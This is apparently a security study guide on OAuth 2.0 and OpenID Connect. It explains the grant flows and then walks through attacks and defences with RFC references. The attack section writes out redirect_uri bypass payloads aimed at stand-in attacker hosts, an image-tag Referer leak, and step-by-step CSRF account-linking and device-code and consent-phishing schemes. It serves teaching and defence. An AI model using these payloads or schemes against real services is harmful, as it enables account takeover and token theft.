# OAuth 2.0 and OpenID Connect (OIDC)

> **Mental model:** OAuth 2.0 is a delegated *authorization* framework (issue a scoped token so app A can call resource server R on behalf of user U). OIDC bolts *authentication* on top (an `id_token`, a signed JWT that asserts who logged in). The framework is deliberately under-specified with almost no mandatory security features, so nearly every real bug is an implementation gap: attacker-controllable routing (`redirect_uri`), a missing CSRF binding (`state`), replay across audiences, or the client treating "I received a valid-looking token/profile" as proof of identity. Endgame is almost always full account takeover.

## How it works (protocol breakdown)

Three (or four) parties:

- **Resource owner**: the user U who owns the data.
- **Client**: the app that wants access. *Confidential* clients (server-side) can hold a `client_secret`; *public* clients (SPAs, mobile, desktop) cannot.
- **Authorization server (AS)**: issues tokens after the user authenticates and consents. Exposes `/authorize` (front channel, via browser) and `/token` (back channel, server-to-server).
- **Resource server (RS)**: the API that accepts the access token. In OIDC-as-SSO, the "RS" is often the AS's `/userinfo` endpoint.

Two channels matter for every attack:

- **Front channel** = through the victim's browser (redirects, URL params/fragments). Anything here is attacker-observable and attacker-influenceable.
- **Back channel** = direct server-to-server HTTPS. An external attacker cannot read or tamper with it, which is exactly why moving secrets to the back channel is the fix for so many bugs.

### Authorization Code grant (the correct default)

```
1. Client -> browser -> AS  /authorize:
   GET /authorize?response_type=code
       &client_id=CLIENT
       &redirect_uri=https://client.com/callback
       &scope=openid%20profile%20email
       &state=RANDOM_CSRF
       &code_challenge=BASE64URL(SHA256(verifier))   # PKCE
       &code_challenge_method=S256
2. User authenticates + consents at the AS.
3. AS -> browser -> client callback:
   302 https://client.com/callback?code=AUTH_CODE&state=RANDOM_CSRF
4. Client -> AS  /token   (BACK CHANNEL):
   POST /token
   grant_type=authorization_code&code=AUTH_CODE
   &redirect_uri=https://client.com/callback
   &client_id=CLIENT&client_secret=SECRET       # or code_verifier for PKCE
5. AS -> client: { access_token, refresh_token, id_token, expires_in, scope }
6. Client -> RS: Authorization: Bearer <access_token>
```

The `code` is a short-lived, single-use, back-channel-redeemable artifact. Even if it leaks in the front channel, redemption requires the `client_secret` (confidential clients) or the PKCE `code_verifier` (public clients), so a bare stolen code is useless against a correctly configured AS. That is the whole security argument for preferring code over implicit.

### Implicit grant (legacy, deprecated)

`response_type=token` returns the access token directly in the URL fragment (`#access_token=...`). No back-channel exchange, so the token is exposed in browser history, `Referer`, and any JavaScript on the callback page. The OAuth 2.0 Security BCP (RFC 9700) deprecates it; OAuth 2.1 removes it. If you see `response_type=token` in the wild, that is a finding by itself.

### PKCE (Proof Key for Code Exchange, RFC 7636)

Client generates a random `code_verifier`, sends `code_challenge = SHA256(verifier)` on `/authorize`, then presents the raw `verifier` on `/token`. The AS binds the issued code to the challenge and rejects redemption without the matching verifier. Originally for public clients (no secret to protect the code), now recommended for *all* clients by RFC 9700 and mandatory in OAuth 2.1. Two downgrade risks: an AS that silently ignores PKCE, and acceptance of `code_challenge_method=plain` (verifier == challenge, no hashing, defeats the point).

### OIDC on top

OIDC adds:

- **`id_token`**: a signed JWT with identity claims (`iss`, `sub`, `aud`, `exp`, `iat`, `nonce`, and profile claims). This is the authentication assertion, meant to be *consumed by the client*, not presented to APIs.
- **`nonce`**: client-generated value echoed inside the `id_token` to bind it to this specific auth request (anti-replay), complementing `state` (which binds the redirect/CSRF).
- **`/userinfo`** endpoint and the **discovery document** at `/.well-known/openid-configuration` (and `/.well-known/oauth-authorization-server`), which leaks supported endpoints, grant types, and features. Always pull these during recon; they often reveal a wider attack surface (dynamic registration, `request_uri`, `web_message` response mode) than the docs mention.

## Attack techniques

### 1. redirect_uri manipulation (the number-one class)

The AS delivers the code/token to `redirect_uri`. If validation is loose, the secret is delivered to the attacker. Probe how it is validated:

```
# Loose prefix/substring matching:
redirect_uri=https://client.com.evil.com/cb
redirect_uri=https://client.com@evil.com/cb
redirect_uri=https://client.com/cb/../../evil        # path traversal on the domain
# Parser differential across components (PortSwigger "Hidden OAuth Attack Vectors"):
redirect_uri=https://default-host.com &@foo.evil.net#@bar.evil.net/
# Parameter pollution:
?redirect_uri=https://client.com/cb&redirect_uri=https://evil.net
# localhost allowances leaking to prod:
redirect_uri=https://localhost.evil.net/cb
```

Changing *other* parameters can loosen `redirect_uri` parsing: flipping `response_mode` from `query` to `fragment`, or noticing that `web_message` response mode is supported, often widens which subdomains/paths are accepted. Why it works: two components of the AS (the validator and the redirector) disagree about which part of the URL is the host, the same class of parser confusion as SSRF and CORS origin bugs.

### 2. Stealing codes/tokens via a whitelisted-domain proxy page

Against strict exact-match validation you often cannot submit an external host, but you may be able to point `redirect_uri` at *another page on the whitelisted domain* that leaks the code/token onward:

- An **open redirect** on the client domain forwards the victim (with `?code=` or `#access_token=`) to the attacker.
- **Dangerous JS / insecure web messaging** (`postMessage` gadgets) that reflects query/fragment to another origin.
- **XSS** on a reachable path: normally XSS is time-limited and blocked from `HttpOnly` cookies, but stealing an OAuth code/token yields the victim's account in the *attacker's* browser, hugely amplifying impact.
- **HTML injection** with no JS: `<img src="//evil.net">` leaks the full callback URL (including `?code=`) via the `Referer` header on some browsers.

Directory-traversal in the callback path is the usual pivot: `redirect_uri=https://client.com/oauth/callback/../../some/injectable/page`.

### 3. CSRF via missing state (account hijack through linking)

If the client omits or fails to validate `state`, the OAuth flow has no CSRF token. On a site that supports both password login and "link a social account," the attacker:

```
1. Attacker starts the OAuth flow with their OWN social account, captures the callback
   URL containing THEIR code, but does not follow it.
2. Attacker delivers that callback URL to a logged-in victim (image, iframe, link).
3. Victim's browser hits /callback?code=ATTACKER_CODE, linking the attacker's social
   identity to the victim's account. Attacker now logs in as the victim via social login.
```

`state` and `nonce` alone do not stop code/token *leakage* attacks (the attacker generates fresh values from their own browser), but a session-bound `state` does stop this CSRF-linking and login-CSRF class. Distinguish the two in an interview.

### 4. Leaking codes/tokens through a lax AS (the classic ATO)

If the AS mis-validates `redirect_uri`, the attacker CSRFs the victim into an OAuth flow whose code lands at an attacker page. For the code grant the attacker does not even need the secret or token: they replay the stolen code to the *real* `/callback`, and the client completes the exchange and logs the attacker into the victim's account. More secure servers require `redirect_uri` again at `/token` and reject a mismatch (back channel, attacker cannot control it).

### 5. Flawed scope validation (scope upgrade)

The token should carry only the consented scope. If the AS does not re-validate:

- **Code flow**: the attacker's registered client adds an extra `scope` at `/token` (`scope=openid email profile`) beyond what the user approved; a lax AS mints the upgraded token.
- **Implicit flow**: the attacker replays a stolen token to `/userinfo` with an added `scope` param, gaining data without re-consent as long as it stays within the client's previously granted ceiling.

### 6. Implicit-grant identity spoofing

In implicit SSO, the client often POSTs `{ userid, access_token }` to its own server to establish a session. The server has no secret to check against, so it *implicitly trusts* the POST. If it does not verify that the token actually belongs to that user (by calling the AS), the attacker swaps `userid` to any value and logs in as anyone.

### 7. Unverified user registration (email confusion)

If the AS lets users register/assert an email without verifying it, and the client links accounts by email claim, an attacker registers at the IdP with the victim's email and logs into the victim's account at the client. Fix side: require verified emails and key on the stable, provider-unique `sub`, not raw email.

### 8. OIDC-specific: id_token validation and dangerous features

- **`id_token` signature/claim validation**: same JWT pitfalls (see the JWT doc): `alg=none`, RS256->HS256 confusion, unchecked `iss`/`aud`/`exp`/`nonce`. An `id_token` accepted without verifying the signature against the IdP's JWKS and without checking `aud`==your client_id is a full auth bypass.
- **`id_token` used as an access token** (or vice versa): different audiences and purposes; a confused-deputy replay.
- **Unprotected dynamic client registration** (`/register`): if open, an attacker registers a client with attacker-controlled `jwks_uri`/`logo_uri`/`redirect_uris`, enabling SSRF (server fetches `logo_uri`) or key control.
- **Request by reference (`request_uri`)**: if the AS fetches an attacker-supplied `request_uri`, that is SSRF, and it can also smuggle parameters the AS trusts.

### 9. IdP mix-up

IdP mix-up targets clients that federate to multiple identity providers and let the user pick which one at login time. The victim clicks "log in with HonestIdP", but an attacker sitting on the discovery or selection page (or via a manipulated login button on a page under partial attacker control) swaps the client's internal state so the flow the client believes it is running is against EvilIdP, while the browser still redirects to HonestIdP (or vice versa). The user authenticates at HonestIdP normally and their browser returns to the client's callback with a legitimate code minted by HonestIdP.

The client now takes that code and, because its internal state says "we are talking to EvilIdP", POSTs it (along with its EvilIdP-registered `client_id`/`client_secret`, or worse, its HonestIdP secret sent to EvilIdP's `/token`) to the attacker-controlled endpoint. EvilIdP obtains an honest-IdP-minted code and, depending on how the client stored per-IdP secrets, credential material as well. The attacker can then redeem the code at HonestIdP or replay captured secrets, all against a user who did nothing unusual.

The fix is RFC 9207: the AS includes an `iss` parameter in the authorization response, and the client verifies before touching `/token` that `iss` matches the IdP it thought this flow belonged to. Per-IdP callback URLs (each IdP lands on a distinct endpoint) achieve the same integrity check by construction. A multi-IdP client with a single callback URL and no `iss` check is vulnerable, and it is a common gap even in mature deployments.

### 10. Device code phishing and illicit consent grant

The device authorization grant (RFC 8628) is designed for input-constrained devices such as TVs and CLIs. The client polls the AS, receives a `user_code` and a `verification_uri`, and instructs the user to visit the URL on a phone or laptop and enter the code. Attack: the phisher initiates a device flow themselves against the real IdP, then sends the victim a message containing the legitimate `verification_uri` and the attacker's `user_code`. The victim visits a real IdP URL, authenticates normally (MFA and all), and approves what looks like their own sign-in. The AS mints tokens to the attacker's polling client. There is no `redirect_uri` involved, the domain in the URL bar is genuinely the IdP, and phishing-resistant MFA (WebAuthn) does not help because the user really is authenticating.

The closely related class is illicit consent-grant phishing. The attacker registers a lookalike OAuth client at the target IdP with an innocuous name (something like `Microsoft Reader` or `Slack Backup`) and requests high-value scopes such as `Mail.Read` plus `offline_access`. The victim receives a normal `/authorize` link, clicks it, sees the real consent screen at the real IdP, and approves. The attacker now holds a long-lived refresh token to the victim's mailbox or drive without a password ever crossing the wire, and rotating the user's password does not revoke the grant.

Defenses live at the tenant/IdP layer, not at the client: require admin consent for high-privilege scopes, block unverified publishers, restrict or disable the device code flow to specific tenants and network locations, use short `verification_uri` TTLs, and audit the granted-consents surface as a first-class security control alongside password and MFA state. This class is the reason "phishing-resistant MFA" is not a complete answer to phishing: the user is legitimately authenticating; only the party receiving the resulting tokens is wrong.

## Defense

For **client applications**:

1. **Use Authorization Code + PKCE for everything.** Retire implicit and any front-channel token delivery. Confidential clients keep `client_secret` server-side; public clients rely on PKCE with `S256` (never `plain`).
2. **Generate, session-bind, and verify `state`** on every flow (CSRF), and **`nonce`** for OIDC (id_token replay). Reject callbacks whose `state` does not match the initiating session.
3. **Exact-match your own `redirect_uri`** and register the fewest, most specific callback URLs. Eliminate open redirects and `postMessage`/reflection gadgets on any registrable callback host, since those become token-exfil primitives.
4. **Validate the `id_token` rigorously**: signature against the IdP JWKS with the algorithm pinned, plus `iss`, `aud` (== your client_id), `exp`, `iat`, and `nonce`. Never accept an `id_token` as an API credential.
5. **Link accounts on verified `sub` + verified email**, never raw email; require re-auth for sensitive linking.
6. **Adopt sender-constrained access tokens where the platform allows it.** Invariant enforced: possession of the token bytes alone is not sufficient to use them; the client must additionally prove possession of a private key on every request. Why it works: mTLS-bound tokens (RFC 8705) embed a hash of the client's TLS certificate in the token's `cnf.x5t#S256` claim and the RS rejects the token unless mTLS completes with the matching cert; DPoP (RFC 9449) is the JS-friendly variant where the client generates an ephemeral keypair, signs a per-request JWT covering method, URL, timestamp, and access-token hash in a `DPoP` header, and the token carries the public-key thumbprint in `cnf.jkt`. Either mechanism turns a token leaked via a log, a proxy, or an XSS exfiltration into a useless artifact and is the direct answer to "how do you defend an SPA access token after issuance when PKCE alone cannot help." Common wrong implementation: issuing DPoP-bound tokens but having the RS silently accept them as bearer when the `DPoP` header is missing, which erases the guarantee.

For **OAuth service providers**:

1. **Require exact `redirect_uri` whitelisting** (full string, no substring/subdomain/wildcard) and re-check `redirect_uri` at `/token`.
2. **Enforce PKCE and reject `plain`.** Bind codes to the client and challenge; make codes single-use and short-lived.
3. **Re-validate `scope`** at every step; never let `/token` or `/userinfo` grant scope beyond the original consent.
4. **Lock down dynamic registration and `request_uri`** (auth required, allowlist fetch targets) to prevent SSRF/key-injection.
5. **Rotate refresh tokens and detect reuse.** Invariant enforced: any refresh token is redeemable at most once, and re-presentation of a consumed token is treated as evidence of theft. Why it works: every `/token` call using a refresh token must return a new refresh token and invalidate its predecessor, with the AS tracking token lineage as a family; if a rotated (already-consumed) refresh token is ever presented again, the AS revokes the entire family and forces re-authentication. RFC 9700 makes rotation mandatory for public clients (SPAs, mobile) and recommended for confidential clients. Sender-constraining the refresh token via mTLS or DPoP raises the bar further so exfiltration alone is useless. Common wrong implementation: issuing rotating refresh tokens without keeping the family graph (so reuse is silently accepted as a fresh redemption), or rotating but leaving the old token valid until natural expiry. A long-lived, non-rotating bearer refresh token in SPA localStorage is the modern equivalent of the implicit-grant footgun.
6. **Support Pushed Authorization Requests (PAR, RFC 9126) and consider requiring it for high-assurance clients.** Invariant enforced: the authorization request parameters (`scope`, `redirect_uri`, `response_type`, `code_challenge`, `resource`) cannot be modified by anything sitting between the client and the AS. Why it works: in PAR the client POSTs the full request to a `/par` endpoint over the back channel with client authentication, receives an opaque short-lived `request_uri`, and only then redirects the browser to `/authorize?client_id=...&request_uri=urn:...`. Nothing sensitive traverses the front channel, so `redirect_uri` swapping, `scope` upgrade at `/authorize`, and PKCE downgrade all become impossible. JAR (RFC 9101) achieves comparable integrity by signing the request as a JWT in the `request` parameter, though the alternative `request_uri` fetch variant is itself an SSRF sink if fetch targets are not allowlisted (see the doc's own point on `request_uri`). PAR is the FAPI 2.0 baseline and the RFC 9700 recommendation for anything above trivial risk. Common wrong implementation: offering PAR as an option but still accepting the same parameters when passed directly to `/authorize`, which leaves the pre-PAR attack surface intact.
7. **Offer sender-constrained access tokens (mTLS via RFC 8705 or DPoP via RFC 9449).** Invariant enforced: token issuance embeds a proof-of-possession key thumbprint (`cnf.x5t#S256` or `cnf.jkt`) that the RS validates on every request. Common wrong implementation: issuing bound tokens but allowing bearer fallback at the RS.

Adopt the hardening RFCs explicitly: **RFC 9700** (OAuth 2.0 Security BCP), **RFC 7636** (PKCE), **RFC 9207** (`iss` in the authorization response, to defeat IdP mix-up), **RFC 8707** (resource indicators, to bind tokens to a specific RS audience), **RFC 9126** (PAR), **RFC 9101** (JAR), **RFC 8705** (mTLS client auth and certificate-bound tokens), **RFC 9449** (DPoP), **RFC 7523** (JWT profile for client authentication), **RFC 8628** (device authorization grant, and its threat model), and OpenID Connect Core for `id_token` handling.

## Interview-grade nuances

- "We match the redirect domain" is not enough: prefix/substring/subdomain/traversal/parser-differential bypasses are the norm; exact match only.
- `state` stops CSRF-linking and login-CSRF but does *not* stop code/token leakage via a bad `redirect_uri` (attacker mints their own `state`). Do not conflate the two.
- A stolen authorization code is low value against a correct AS (needs secret/PKCE + `redirect_uri` re-check); a stolen *implicit* access token is immediately usable against `/userinfo`. That difference is the reason implicit is dead.
- PKCE is now for all clients, not just mobile; the modern downgrade bug is an AS that accepts `code_challenge_method=plain` or ignores PKCE entirely.
- "Valid token" is not "valid for me": always check `aud`/`azp`/`iss`/scope at the RS. Confused-deputy replay across audiences is a top API-side OAuth bug.
- OAuth is authorization; using it for authentication (SSO) is where the identity-spoofing and email-confusion bugs live, because the client is inferring identity from an authorization artifact.
- Client authentication at `/token` is a spectrum, not a checkbox. `client_secret_basic` (Basic header) and `client_secret_post` (in the body) are functionally equivalent shared-secret schemes: a leaked log, a stolen backup, or an SSRF into the client all yield full client impersonation. `private_key_jwt` (RFC 7523) has the client sign a short-lived JWT assertion with a private key held only client-side, so the AS stores just the public key and an AS breach does not compromise the client. `tls_client_auth` and `self_signed_tls_client_auth` (RFC 8705) authenticate via mTLS at the token endpoint and additionally unlock certificate-bound access tokens. Rule of thumb: high-value or regulated clients, and any FAPI-profile deployment, should use `private_key_jwt` or mTLS; `client_secret_basic` is acceptable only when secret storage and rotation are actually solved. Public clients use none of these and rely on PKCE alone, which is why they should never be granted sensitive scopes without additional sender-constraint.

## Sources

- PortSwigger: OAuth 2.0 authentication vulnerabilities: https://portswigger.net/web-security/oauth
- PortSwigger: OAuth grant types: https://portswigger.net/web-security/oauth/grant-types
- PortSwigger: OpenID Connect: https://portswigger.net/web-security/oauth/openid
- PortSwigger research: Hidden OAuth Attack Vectors: https://portswigger.net/research/hidden-oauth-attack-vectors
- RFC 9700 (OAuth 2.0 Security Best Current Practice): https://datatracker.ietf.org/doc/html/rfc9700
- RFC 7636 (PKCE): https://datatracker.ietf.org/doc/html/rfc7636
- RFC 9207 (iss authorization response parameter): https://datatracker.ietf.org/doc/html/rfc9207
- RFC 8628 (OAuth 2.0 Device Authorization Grant): https://datatracker.ietf.org/doc/html/rfc8628
- RFC 9126 (Pushed Authorization Requests): https://datatracker.ietf.org/doc/html/rfc9126
- RFC 9101 (JWT-Secured Authorization Request): https://datatracker.ietf.org/doc/html/rfc9101
- RFC 8705 (Mutual-TLS Client Authentication and Certificate-Bound Access Tokens): https://datatracker.ietf.org/doc/html/rfc8705
- RFC 9449 (DPoP: Demonstrating Proof of Possession): https://datatracker.ietf.org/doc/html/rfc9449
- RFC 7523 (JWT Profile for Client Authentication): https://datatracker.ietf.org/doc/html/rfc7523
- OpenID Connect Core 1.0: https://openid.net/specs/openid-connect-core-1_0.html
